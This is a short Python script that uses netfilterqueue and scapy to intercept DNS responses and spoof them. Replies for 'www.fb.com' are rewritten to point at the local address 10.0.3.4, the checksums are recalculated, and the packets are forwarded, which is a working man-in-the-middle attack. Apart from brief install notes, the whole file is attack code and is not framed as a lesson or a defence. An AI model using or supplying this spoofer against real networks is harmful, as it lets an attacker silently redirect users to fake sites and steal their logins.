#!usr/bin/env python3

'''
    pip3 install -U git+https://github.com/kti/python-netfilterqueue
    pip3 install scapy[basic]


    run local server
    
'''

import netfilterqueue
import scapy.all as scapy



def processPacket(packet):
    #create a packet that contains the original packet
    scapy_packet = scapy.IP(packet.get_payload())

    #check if the packet has a DNS Reply field
    if (scapy_packet.haslayer(scapy.DNSRR)):
        # get the name of the requested website
        qname = scapy_packet[scapy.DNSQR].qname
        # check that the requested domain is our spoof domain
        if ("www.fb.com" in str(qname)):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.3.4")
            # replace the answer field with the modified one
            scapy_packet[scapy.DNS].an = answer
            # modify metadata (other fields)
            scapy_packet[scapy.DNS].ancount = 1
            # delete the fields so scapy can recalculate them by itself
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            #set the payload of the original file to the modified packet
            packet.set_payload(bytes(scapy_packet))

    # let the packet pass the packet (forward)
    packet.accept()


# not interracting still with the queue in the system
queue = netfilterqueue.NetfilterQueue()
# bind to the queue created in the system, process packet is called for every packet
queue.bind(0, processPacket)
queue.run()

